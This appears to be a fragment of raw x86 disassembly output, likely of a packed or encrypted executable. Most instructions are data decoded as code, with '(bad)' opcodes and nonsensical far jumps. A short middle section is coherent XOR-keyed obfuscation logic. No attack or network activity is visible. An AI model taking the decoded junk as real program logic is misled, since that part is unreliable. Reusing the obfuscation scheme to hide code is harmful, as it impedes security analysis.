  417e14:	cmp    ebp,DWORD PTR [ebp+0x60ea54da]
  417e1a:	cmp    bh,cl
  417e1c:	push   0xffffffe7
  417e1e:	ret    
  417e1f:	iret   
  417e20:	jbe    0x417dab
  417e22:	dec    ecx
  417e23:	cld    
  417e24:	dec    edi
  417e25:	cld    
  417e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e27:	xor    DWORD PTR [ebx-0xb6dc2a4],ecx
  417e2d:	dec    edi
  417e2e:	sbb    BYTE PTR ds:0xa967338e,ah
  417e34:	and    bh,bh
  417e36:	adc    dl,BYTE PTR [eax+0x58dd8fd3]
  417e3c:	aad    0xb1
  417e3e:	sub    al,0x12
  417e40:	es jo  0x417eb5
  417e43:	sbb    al,0xcf
  417e45:	inc    ebp
  417e46:	lods   eax,DWORD PTR ds:[esi]
  417e47:	mov    ebp,0xb4d2f3ed
  417e4c:	jno    0x417ecd
  417e4e:	(bad)  
  417e4f:	js     0x417e3e
  417e51:	scas   eax,DWORD PTR es:[edi]
  417e52:	jp     0x417ec9
  417e54:	jnp    0x417e41
  417e56:	adc    BYTE PTR [edx-0x29],ch
  417e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e5a:	or     BYTE PTR [eax-0x15],dl
  417e5d:	enter  0x9c88,0xf8
  417e61:	int3   
  417e62:	and    bl,al
  417e64:	inc    edi
  417e65:	xchg   ebp,eax
  417e66:	cmp    dl,BYTE PTR [eax-0x47ceac80]
  417e6c:	xchg   ebp,eax
  417e6d:	sti    
  417e6e:	push   ebp
  417e6f:	outs   dx,DWORD PTR ds:[esi]
  417e70:	nop
  417e71:	scas   al,BYTE PTR es:[edi]
  417e72:	lahf   
  417e73:	loopne 0x417e79
  417e75:	sahf   
  417e76:	sub    al,0x96
  417e78:	icebp  
  417e79:	dec    esi
  417e7a:	in     eax,dx
  417e7b:	jo     0x417e89
  417e7d:	scas   al,BYTE PTR es:[edi]
  417e7e:	mov    DWORD PTR [edx-0x62],ebp
  417e81:	aaa    
  417e82:	cmc    
  417e83:	mov    bh,0x95
  417e85:	fdivrp st(2),st
  417e87:	(bad)  
  417e89:	push   ebp
  417e8a:	je     0x417e84
  417e8c:	and    eax,0x18ce930d
  417e91:	outs   dx,DWORD PTR ds:[esi]
  417e92:	js     0x417e7a
  417e94:	dec    esi
  417e95:	(bad)  
  417e97:	mov    ebx,ds
  417e99:	cmp    DWORD PTR [edi+0x61],esi
  417e9c:	sbb    al,0x2
  417e9e:	mov    WORD PTR [edx+0x67d496ca],fs
  417ea4:	repnz lds ebp,FWORD PTR [eax+eiz*1+0xd]
  417ea9:	shl    sp,0x7f
  417ead:	or     BYTE PTR [esi],cl
  417eaf:	repnz push cs
  417eb1:	sub    al,0x7d
  417eb3:	adc    DWORD PTR [esi-0x1a46a11e],edi
  417eb9:	xchg   BYTE PTR [esi-0xfe9d308],bh
  417ebf:	in     al,dx
  417ec0:	inc    esp
  417ec1:	inc    ecx
  417ec2:	push   ebx
  417ec3:	(bad)  
  417ec4:	or     BYTE PTR [edx+0xe],dl
  417ec7:	jg     0x417ec9
  417ec9:	mov    WORD PTR [ebp+ebp*1+0x4d507e60],ss
  417ed0:	jmp    0x4f59:0x21764fe2
  417ed7:	sti    
  417ed8:	leave  
  417ed9:	in     eax,0x6b
  417edb:	ret    
  417edc:	je     0x417f39
  417ede:	repnz dec esi
  417ee0:	and    cl,BYTE PTR [edi]
  417ee2:	mov    ebp,0xa0bbf20d
  417ee7:	out    0x74,al
  417ee9:	out    0x30,al
  417eeb:	enter  0x428f,0xc8
  417eef:	xchg   DWORD PTR [edi],eax
  417ef1:	outs   dx,BYTE PTR ds:[esi]
  417ef2:	lods   eax,DWORD PTR ds:[esi]
  417ef3:	mov    ch,0x13
  417ef5:	pushf  
  417ef6:	sahf   
  417ef7:	retf   0x1ada
  417efa:	mov    edi,0x433f5f5d
  417eff:	ds inc ecx
  417f01:	jb     0x417eda
  417f03:	ja     0x417f08
  417f05:	xchg   edx,eax
  417f06:	sti    
  417f07:	lahf   
  417f08:	sbb    edx,esp
  417f0a:	jge    0x417e91
  417f0c:	aaa    
  417f0d:	daa    
  417f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f0f:	sbb    dh,bl
  417f11:	nop
  417f12:	out    0x10,al
  417f14:	cmp    BYTE PTR [ecx+0x1d],ah
  417f17:	inc    esp
  417f18:	mov    al,ds:0xe31579d0
  417f1d:	fild   DWORD PTR [esi+eiz*1-0x38fe0ccf]
  417f24:	test   al,0xa
  417f26:	inc    eax
  417f27:	push   eax
  417f28:	inc    esp
  417f29:	ins    BYTE PTR es:[edi],dx
  417f2a:	and    eax,0xb1b9a566
  417f2f:	fist   DWORD PTR [ecx+0x728cb91]
  417f35:	mov    cl,0x94
  417f37:	push   0xce391ac7
  417f3c:	cmp    ebp,DWORD PTR [edi+0x50]
  417f3f:	and    edi,ecx
  417f41:	inc    edx
  417f42:	shl    DWORD PTR [eax+0x37774dcb],0xdf
  417f49:	popf   
  417f4a:	retf   
  417f4b:	mov    ebx,0x2abdb35d
  417f50:	nop
  417f51:	out    0x7d,al
  417f53:	xchg   edx,eax
  417f54:	icebp  
  417f55:	div    DWORD PTR [esi-0x1b]
  417f58:	adc    al,0xf0
  417f5a:	fidiv  WORD PTR [ebp+0x7fe9b9eb]
  417f60:	push   es
  417f61:	das    
  417f62:	mov    bh,0x70
  417f64:	(bad)  
  417f65:	cdq    
  417f66:	out    0x8b,eax
  417f68:	rcr    bh,1
  417f6a:	push   0xfffffff3
  417f6c:	adc    ah,cl
  417f6e:	in     eax,0x6c
  417f70:	xchg   edx,eax
  417f71:	mov    al,0x8a
  417f73:	inc    ebp
  417f74:	push   cs
  417f75:	test   eax,0xad4aeca9
  417f7a:	aaa    
  417f7b:	shl    BYTE PTR [esi],1
  417f7d:	inc    esi
  417f7e:	sub    bh,0x35
  417f81:	shl    ah,cl
  417f83:	sub    BYTE PTR [ebx-0x78],bh
  417f86:	in     al,0xfb
  417f88:	clc    
  417f89:	ins    DWORD PTR es:[edi],dx
  417f8a:	sub    ch,BYTE PTR [ebx+0x57d3b131]
  417f90:	sub    eax,0x87baec06
  417f95:	leave  
  417f96:	xor    eax,0x1433592a
  417f9b:	cmp    ecx,ecx
  417f9d:	les    eax,FWORD PTR ds:0x3b598377
  417fa3:	mov    bh,0x48
  417fa5:	dec    ebp
  417fa6:	xchg   esi,eax
  417fa7:	adc    ebx,ecx
  417fa9:	inc    ebp
  417faa:	test   eax,0xedc19d7
  417faf:	pop    ebp
  417fb0:	mov    edx,DWORD PTR [edi+0x1f]
  417fb3:	imul   ebx,edx,0xa
  417fb6:	jns    0x41802b
  417fb8:	retf   0x2603
  417fbb:	imul   ecx,DWORD PTR [ebp-0x2c],0x38
  417fbf:	adc    DWORD PTR [esp+ecx*8+0x6ba0fe2b],edx
  417fc6:	stc    
  417fc7:	outs   dx,DWORD PTR ds:[esi]
  417fc8:	cs pushf 
  417fca:	lea    ecx,[edx+0x15]
  417fcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fce:	es dec ebp
  417fd0:	dec    edx
  417fd1:	pop    ss
  417fd2:	inc    ebx
  417fd3:	sub    edx,esi
  417fd5:	lods   al,BYTE PTR ds:[esi]
  417fd6:	add    eax,0xd6876f7f
  417fdb:	adc    BYTE PTR [ebx],bl
  417fdd:	mov    dl,0xc4
  417fdf:	imul   ebx,DWORD PTR [edx],0x7d
  417fe2:	les    edx,FWORD PTR [ecx+0x3b]
  417fe5:	xchg   BYTE PTR [esi+0x62],ch
  417fe8:	xchg   BYTE PTR [ecx],ah
  417fea:	neg    DWORD PTR [ebp-0x15573ac4]
  417ff0:	clc    
  417ff1:	fcmovnb st,st(7)
  417ff3:	and    DWORD PTR [eax+0x42],esp
  417ff6:	xor    eax,0x497ef0f2
  417ffb:	mov    ebx,0xb39fc2bf
  418000:	jecxz  0x418066
  418002:	mov    ds:0x88aebdc3,eax
  418007:	and    esp,DWORD PTR [edi+0x421af6e3]
  41800d:	jl     0x418072
  41800f:	pop    esi
  418010:	sub    eax,0xe0363b8d
  418015:	(bad)  
  418016:	jecxz  0x417f9e
  418018:	push   esp
  418019:	or     DWORD PTR [ebp+0x63],esp
  41801c:	lods   eax,DWORD PTR ds:[esi]
  41801d:	xor    eax,0xa86559bc
  418022:	into   
  418023:	fnstsw WORD PTR [ecx+0x40]
  418026:	inc    edx
  418027:	les    ebx,FWORD PTR [edi-0x17ab33da]
  41802d:	in     eax,dx
  41802e:	and    BYTE PTR [esi],0xf7
  418031:	adc    ah,bh
  418033:	daa    
  418034:	popf   
  418035:	dec    ebp
  418036:	mov    BYTE PTR [esi],al
  418038:	dec    ebp
  418039:	inc    ebx
  41803a:	je     0x417fc4
  41803c:	and    BYTE PTR [ecx-0x5cf8d01a],0x5d
  418043:	xor    ebp,eax
  418045:	or     al,dh
  418047:	in     eax,0x85
  418049:	scas   al,BYTE PTR es:[edi]
  41804a:	neg    BYTE PTR [ebx]
  41804c:	(bad)  
  41804d:	pop    edx
  41804e:	sbb    eax,0x6d8756fd
  418053:	mov    BYTE PTR [eax-0x39b48695],bh
  418059:	sbb    DWORD PTR [ecx],esi
  41805b:	mov    ecx,0x18999939
  418060:	xchg   edx,eax
  418061:	(bad)  
  418062:	dec    esi
  418063:	pop    esp
  418064:	inc    esi
  418065:	rcr    bh,1
  418067:	pop    eax
  418068:	repz dec edx
  41806a:	mov    ebp,0xb0b69e0c
  41806f:	mov    esp,0x7149e551
  418074:	xor    eax,0xf816a590
  418079:	mov    ebx,eax
  41807b:	xchg   BYTE PTR [edx],ch
  41807d:	div    BYTE PTR [ebp+ebp*8+0x50]
  418081:	dec    edi
  418082:	jnp    0x4180c1
  418084:	mov    ds:0xb3d55452,al
  418089:	mov    cl,0x41
  41808b:	mov    eax,ds:0x53e216e2
  418090:	and    BYTE PTR [eax+ebp*8+0x68ba405],cl
  418097:	es xchg esi,eax
  418099:	stc    
  41809a:	mov    BYTE PTR [edi+0x46],0xa5
  41809e:	je     0x41807d
  4180a0:	sbb    DWORD PTR [ebx+0x6558ea88],ebx
  4180a6:	cmp    ch,BYTE PTR [edi-0xc]
  4180a9:	mov    al,0x5e
  4180ab:	aas    
  4180ac:	xchg   BYTE PTR [edx-0x35],bh
  4180af:	int3   
  4180b0:	sahf   
  4180b1:	retf   0xcbe
  4180b4:	faddp  st(3),st
  4180b6:	pusha  
  4180b7:	dec    esp
  4180b8:	cmp    DWORD PTR [ebp+0x43],esp
  4180bb:	sub    DWORD PTR [esi+0x24],edi
  4180be:	xchg   edx,eax
  4180bf:	test   al,0xf8
  4180c1:	mov    eax,?
  4180c3:	or     bl,BYTE PTR [ebp-0x5cd31876]
  4180c9:	xchg   ebp,eax
  4180ca:	stos   BYTE PTR es:[edi],al
  4180cb:	out    0xf4,eax
  4180cd:	cli    
  4180ce:	popf   
  4180cf:	leave  
  4180d0:	or     eax,ecx
  4180d2:	or     DWORD PTR [esi-0x2],0x69896eda
  4180d9:	int    0xf
  4180db:	push   cs
  4180dc:	cmp    DWORD PTR [ecx-0x11],0x4a1dfe9c
  4180e3:	mov    WORD PTR [ecx],ss
  4180e5:	sbb    DWORD PTR [ecx-0x52],0x63
  4180e9:	jns    0x4180fb
  4180eb:	xlat   BYTE PTR ds:[ebx]
  4180ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ed:	fisttp DWORD PTR [edi]
  4180ef:	ins    DWORD PTR es:[edi],dx
  4180f0:	scas   al,BYTE PTR es:[edi]
  4180f1:	int    0x42
  4180f3:	jmp    0x60d0dd19
  4180f8:	es jbe 0x4180d8
  4180fb:	je     0x41812a
  4180fd:	aad    0xc4
  4180ff:	dec    ebp
  418100:	sub    al,0x8a
  418102:	stos   BYTE PTR es:[edi],al
  418103:	popa   
  418104:	stos   BYTE PTR es:[edi],al
  418105:	adc    ecx,DWORD PTR [esi]
  418107:	mov    WORD PTR [edi+0x18aee75b],?
  41810d:	pop    edx
  41810e:	mov    dl,0xb1
  418110:	stos   BYTE PTR es:[edi],al
  418111:	cmp    eax,0xda3732d3
  418116:	(bad)  
  418117:	in     eax,0xfd
  418119:	sahf   
  41811a:	adc    DWORD PTR [eax-0x78],edi
  41811d:	cdq    
  41811e:	je     0x4180d0
  418120:	sub    al,0x69
  418122:	xchg   ecx,eax
  418123:	aad    0x17
  418125:	lahf   
  418126:	mov    edi,0x4ee86210
  41812b:	(bad)  es:[ebx+edi*4]
  41812f:	mov    BYTE PTR [ecx],bh
  418131:	(bad)  
  418132:	jg     0x418132
  418134:	je     0x418129
  418136:	mov    dh,0x2f
  418138:	jle    0x418123
  41813a:	mov    WORD PTR [esi],ss
  41813c:	inc    edi
  41813d:	shrd   eax,ecx,cl
  418140:	add    eax,DWORD PTR [ecx+0x64e8ca0d]
  418146:	test   al,bh
  418148:	or     BYTE PTR [eax+0x49232895],dh
  41814e:	(bad)  
  41814f:	xchg   esi,eax
  418150:	xchg   ecx,eax
  418151:	int    0x31
  418153:	loop   0x4181c4
  418155:	test   DWORD PTR [esi],ebp
  418157:	gs retf 0x8f7c
  41815b:	gs jecxz 0x418191
  41815e:	icebp  
  41815f:	pop    edx
  418160:	xchg   DWORD PTR [edx-0x3b],esi
  418163:	mov    DWORD PTR [eax],esp
  418165:	ret    0xb94c
  418168:	cwde   
  418169:	aad    0x77
  41816b:	inc    DWORD PTR [edx-0x317683ac]
  418171:	daa    
  418172:	ror    BYTE PTR [ebx+0x43],1
  418175:	and    al,0x17
  418177:	add    DWORD PTR [esi],esi
  418179:	ret    0xfc0e
  41817c:	mov    bh,0xe
  41817e:	inc    esp
  41817f:	sub    al,0xa0
  418181:	cmp    DWORD PTR [esi-0x68],esp
  418184:	xchg   edx,eax
  418185:	mov    dl,0xab
  418187:	popf   
  418188:	mov    DWORD PTR [ecx+0x5b],ebp
  41818b:	aad    0x34
  41818d:	cmc    
  41818e:	push   edi
  41818f:	(bad)  
  418191:	add    ebx,eax
  418193:	push   eax
  418194:	or     eax,0xc3464b4
  418199:	rol    BYTE PTR [esp+eax*1+0x3d],1
  41819d:	add    DWORD PTR [ebx-0x45b6b238],esp
  4181a3:	mov    bh,0x2a
  4181a5:	repz ds push ecx
  4181a8:	sub    DWORD PTR [ecx],0x7
  4181ab:	add    ch,BYTE PTR [ecx]
  4181ad:	jbe    0x4181f5
  4181af:	aad    0xdc
  4181b1:	push   es
  4181b2:	mov    ds:0xd8a8efb9,eax
  4181b7:	imul   ebp,edi,0x12
  4181ba:	and    dh,cl
  4181bc:	sub    BYTE PTR [edx+0x21],bl
  4181bf:	stos   DWORD PTR es:[edi],eax
  4181c0:	cld    
  4181c1:	add    al,0x77
  4181c3:	push   ecx
  4181c4:	les    eax,FWORD PTR [ebp-0x18]
  4181c7:	mov    edx,0x21e0c180
  4181cc:	imul   edi,DWORD PTR fs:[edx],0xffffff81
  4181d0:	adc    BYTE PTR [eax+eiz*4-0x14],al
  4181d4:	mov    cl,0xe1
  4181d6:	shr    BYTE PTR [eax],0xf5
  4181d9:	pop    es
  4181da:	lods   al,BYTE PTR ds:[esi]
  4181db:	pop    edx
  4181dc:	idiv   DWORD PTR [ecx+0x1df14f77]
  4181e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181e3:	sahf   
  4181e4:	cmp    BYTE PTR [edx-0x2c],ah
  4181e7:	imul   esp,DWORD PTR [ecx+edi*8-0x56508616],0x13
  4181ef:	dec    eax
  4181f0:	adc    BYTE PTR [esi+0x15058a0],bl
  4181f6:	int    0x94
  4181f8:	add    eax,0x811ed45a
  4181fd:	mov    dh,0x40
  4181ff:	sbb    esi,edi
  418201:	jl     0x41821e
  418203:	sub    al,0xa9
  418205:	jmp    0x2f78:0x1d308da1
  41820c:	mov    ds:0x6d76f060,al
  418211:	inc    esi
  418212:	sub    al,0x8d
  418214:	je     0x418279
  418216:	jo     0x41823d
  418218:	fimul  WORD PTR [edx]
  41821a:	push   0x189bc54a
  41821f:	out    dx,eax
  418220:	sbb    eax,0xdb2f4303
  418225:	cli    
  418226:	loop   0x418234
  418228:	mov    ebp,0x5f5985fe
  41822d:	shl    BYTE PTR [edi],cl
  41822f:	sbb    edi,DWORD PTR ds:0x26d9851b
  418235:	loop   0x4182b6
  418237:	mov    esi,0xe29cbb5c
  41823c:	sahf   
  41823d:	lea    esi,[edi-0x43]
  418240:	inc    ebx
  418241:	and    al,0x60
  418243:	and    edx,ecx
  418245:	jp     0x418203
  418247:	dec    ebx
  418248:	and    BYTE PTR [ebx],0x54
  41824b:	fimul  DWORD PTR [esi-0x3de8b3b0]
  418251:	cmp    esi,ebp
  418253:	sti    
  418254:	inc    ecx
  418255:	push   es
  418256:	sbb    esi,DWORD PTR [edi+ecx*2+0x2021612d]
  41825d:	pop    es
  41825e:	and    al,0x87
  418260:	loope  0x418287
  418262:	scas   al,BYTE PTR es:[edi]
  418263:	add    ecx,edx
  418265:	mov    eax,0x20300a31
  41826a:	hlt    
  41826b:	pop    edx
  41826c:	std    
  41826d:	ret    0x60b4
  418270:	clc    
  418271:	out    0xe3,eax
  418273:	dec    esi
  418274:	out    0xca,al
  418276:	pop    ecx
  418277:	xchg   esp,eax
  418278:	mov    ebp,0x48ff3103
  41827d:	or     esi,DWORD PTR [eax+0x5276a0ea]
  418283:	dec    ebp
  418284:	pusha  
  418285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418286:	xor    eax,0xe269bc9d
  41828b:	out    dx,al
  41828c:	clc    
  41828d:	xor    BYTE PTR [edx+0x699b0135],bl
  418293:	xchg   edx,eax
  418294:	xchg   edx,eax
  418295:	push   edx
  418296:	or     BYTE PTR [eax+0x32],0xc2
  41829a:	shl    BYTE PTR [eax+0x56],0x40
  41829e:	not    BYTE PTR [eax]
  4182a0:	and    eax,0xaa3cf456
  4182a5:	sub    BYTE PTR [ecx-0x7f],ch
  4182a8:	stos   BYTE PTR es:[edi],al
  4182a9:	test   BYTE PTR [ebx+0x17],dl
  4182ac:	xor    DWORD PTR [eax-0x14f90d9b],ebx
  4182b2:	gs int3 
  4182b4:	dec    esi
  4182b5:	xor    eax,0x392b3903
  4182ba:	and    bh,bh
  4182bc:	sub    DWORD PTR [ecx],ecx
  4182be:	jp     0x418241
  4182c0:	mov    esi,0x4836eba4
  4182c5:	sub    al,0x1b
  4182c7:	sahf   
  4182c8:	sbb    ebx,esp
  4182ca:	mov    edi,0xa981ee19
  4182cf:	adc    edi,edx
  4182d1:	adc    eax,0x954113c2
  4182d6:	loop   0x4182b3
  4182d8:	adc    BYTE PTR [ebx],cl
  4182da:	enter  0x3921,0x75
  4182de:	ins    DWORD PTR es:[edi],dx
  4182df:	inc    ecx
  4182e0:	xor    eax,0x6828eb9f
  4182e5:	rol    BYTE PTR [ecx+0x70],cl
  4182e8:	mov    edx,0x5ca1af96
  4182ed:	out    0xb2,al
  4182ef:	mov    dh,BYTE PTR [ebp+ebp*2-0x67]
  4182f3:	mov    ebp,0x1aaff505
  4182f8:	test   al,0xd4
  4182fa:	lods   al,BYTE PTR ds:[esi]
  4182fb:	push   ebp
  4182fc:	into   
  4182fd:	jmp    0x13a2:0x6038adf2
  418304:	lods   eax,DWORD PTR ds:[esi]
  418305:	sbb    BYTE PTR [ecx+0x129c7eb0],0xbc
  41830c:	in     al,dx
  41830d:	xor    eax,0x883ba4a1
  418312:	xchg   edx,eax
  418313:	xor    dh,cl
  418315:	scas   eax,DWORD PTR es:[edi]
  418316:	lahf   
  418317:	imul   esi,esp,0x7670ffa
  41831d:	int3   
  41831e:	scas   al,BYTE PTR es:[edi]
  41831f:	arpl   WORD PTR [ecx],bp
  418321:	mov    dl,0xc2
  418323:	xchg   esi,eax
  418324:	call   FWORD PTR ds:0x514938ec
  41832a:	lds    ebp,FWORD PTR [ebx-0x37]
  41832d:	lock sub ch,ch
  418330:	mov    cl,0xee
  418332:	or     dh,bl
  418334:	sbb    eax,0x57f022de
  418339:	jmp    0xcfb:0x7f0ced07
  418340:	sub    al,0x8a
  418342:	xor    dh,BYTE PTR [ebp+ebx*8+0x5]
  418346:	vaddsubps ymm3,ymm5,YMMWORD PTR [ebx+0x70]
  41834b:	imul   esp,DWORD PTR [eax+ebp*8],0x6bfc9b6f
  418352:	xor    eax,ebp
  418354:	and    ah,dl
  418356:	mov    BYTE PTR [ecx+0x2e],bl
  418359:	dec    edi
  41835a:	jp     0x418393
  41835c:	push   esi
  41835d:	xchg   edx,ecx
  41835f:	mov    BYTE PTR [ecx+0xc7c309e],dh
  418365:	mov    ecx,0x99e86ead
  41836a:	mov    eax,0x339c214c
  41836f:	dec    esi
  418370:	mov    WORD PTR [edx],ds
  418372:	jp     0x4183d2
  418374:	mov    edi,0x9517ecb2
  418379:	sbb    BYTE PTR [edx-0x4e],dh
  41837c:	pop    ds
  41837d:	push   ebx
  41837e:	mov    ds:0x1c8f330e,eax
  418383:	add    DWORD PTR [ebp-0x7af0d2af],ecx
  418389:	icebp  
  41838a:	mov    eax,0x558bffff
  41838f:	hlt    
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	in     eax,0x26
  41848d:	mov    ah,0x5d
  41848f:	int3   
  418490:	xor    BYTE PTR [ebp+0x7c],bh
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	sbb    DWORD PTR [edx+0x6a],eax
  41849a:	mov    bh,0xc6
  41849c:	scas   eax,DWORD PTR es:[edi]
  41849d:	cdq    
  41849e:	mov    ecx,0x7b5a95d
  4184a3:	fwait
  4184a4:	(bad)  
  4184a5:	imul   ebp,DWORD PTR [eax+0x66cd0834],0x7
  4184ac:	xlat   BYTE PTR ds:[ebx]
  4184ad:	into   
  4184ae:	jmp    0x4184c4
  4184b0:	in     eax,dx
  4184b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184b2:	sub    ebp,0xffffffa8
  4184b5:	lock call 0x5a0d:0x60748f86
  4184bd:	sahf   
  4184be:	aaa    
  4184bf:	les    ecx,FWORD PTR [ecx]
  4184c1:	leave  
  4184c2:	sub    esi,DWORD PTR [edx+ebp*2]
  4184c5:	sub    DWORD PTR [edx-0x811162e],ecx
  4184cb:	popa   
  4184cc:	sbb    al,dh
  4184ce:	popf   
  4184cf:	stc    
  4184d0:	lds    edx,FWORD PTR [edi+0x593324d7]
  4184d6:	or     BYTE PTR cs:[esi-0x2a],dh
  4184da:	pop    edx
  4184db:	or     DWORD PTR [edi+esi*1],edi
  4184de:	pop    edi
  4184df:	jno    0x418469
  4184e1:	push   edx
  4184e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184e3:	sahf   
  4184e4:	mov    eax,0xd0cd7789
  4184e9:	xor    BYTE PTR [esi+0x42],dh
  4184ec:	sbb    DWORD PTR [ebx-0xd040a75],ebp
  4184f2:	jb     0x418572
  4184f4:	inc    esp
  4184f5:	xchg   esp,edi
  4184f7:	shl    cl,cl
  4184f9:	ins    BYTE PTR es:[edi],dx
  4184fa:	cmp    DWORD PTR ds:0xbe5eefa4,ecx
  418500:	inc    eax
  418501:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  418503:	mov    ah,0x3f
  418505:	cli    
  418506:	mov    bl,0xf8
  418508:	jb     0x4184fe
  41850a:	dec    ecx
  41850b:	inc    ebx
  41850c:	in     eax,dx
  41850d:	inc    esp
  41850e:	mov    ebx,0x564ba4b
  418513:	loop   0x41854c
  418515:	lahf   
  418516:	aam    0xce
  418518:	pop    ecx
  418519:	mov    dh,0x8a
  41851b:	arpl   dx,cx
  41851d:	dec    esi
  41851e:	cmp    edi,esi
  418520:	es sbb eax,0x7fae1d5d
  418526:	mov    al,0x6f
  418528:	adc    al,0x74
  41852a:	cmp    al,0x29
  41852c:	jb     0x41857a
  41852e:	stos   BYTE PTR es:[edi],al
  41852f:	test   al,0x81
  418531:	(bad)
  418534:	mov    cl,0xd2
  418536:	push   edi
  418537:	jp     0x4185b3
  418539:	cmc    
  41853a:	out    dx,al
  41853b:	dec    esp
  41853c:	out    dx,eax
  41853d:	out    0x6,al
  41853f:	rcr    DWORD PTR [edx],0x8b
  418542:	scas   al,BYTE PTR es:[edi]
  418543:	leave  
  418544:	fwait
  418545:	xchg   edi,eax
  418546:	add    ebp,DWORD PTR [ebx+0x5b20b905]
  41854c:	push   ecx
  41854d:	xchg   edi,eax
  41854e:	std    
  41854f:	inc    ebx
  418550:	dec    ebp
  418551:	mov    esi,0x34bb4936
  418556:	ficomp DWORD PTR [eax+0x1280e3b]
  41855c:	stos   DWORD PTR es:[edi],eax
  41855d:	aad    0x38
  41855f:	test   BYTE PTR [esi+edx*8-0x3a],dl
  418563:	loop   0x418531
  418565:	and    al,0x13
  418567:	cdq    
  418568:	jne    0x4185b2
  41856a:	mov    DWORD PTR [ecx],eax
  41856c:	xor    eax,DWORD PTR [eax+0xd]
  41856f:	add    dl,BYTE PTR [edi+0x2b]
  418572:	push   ecx
  418573:	pop    edx
  418574:	ficom  WORD PTR [edi-0x66b8f492]
  41857a:	cmp    bh,ch
  41857c:	into   
  41857d:	dec    edx
  41857e:	sbb    esi,DWORD PTR [ebp-0x2e5c397b]
  418584:	lahf   
  418585:	in     al,0x74
  418587:	jb     0x4185c8
  418589:	push   ds
  41858a:	cmc    
  41858b:	mov    bl,0x37
  41858d:	sahf   
  41858e:	mov    al,ds:0xe1a50f68
  418593:	rcl    BYTE PTR [ebp+ecx*1+0x51],cl
  418597:	xor    al,0x25
  418599:	pop    ds
  41859a:	lock dec esp
  41859c:	inc    edx
  41859d:	out    0x97,al
  41859f:	jmp    0x418555
  4185a1:	call   0x25990378
  4185a6:	adc    edx,ecx
  4185a8:	popf   
  4185a9:	pop    ds
  4185aa:	sub    al,0x11
  4185ac:	adc    eax,0xd92f9a70
  4185b1:	stos   BYTE PTR es:[edi],al
  4185b2:	sub    esp,ecx
  4185b4:	push   edi
  4185b5:	pop    edx
  4185b6:	mov    ds:0x8142bba3,al
  4185bb:	mov    DWORD PTR ds:0x8114f7e4,eax
  4185c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185c2:	rcr    DWORD PTR [eax+ecx*4+0x7db0c461],0xe5
  4185ca:	xor    al,0x6
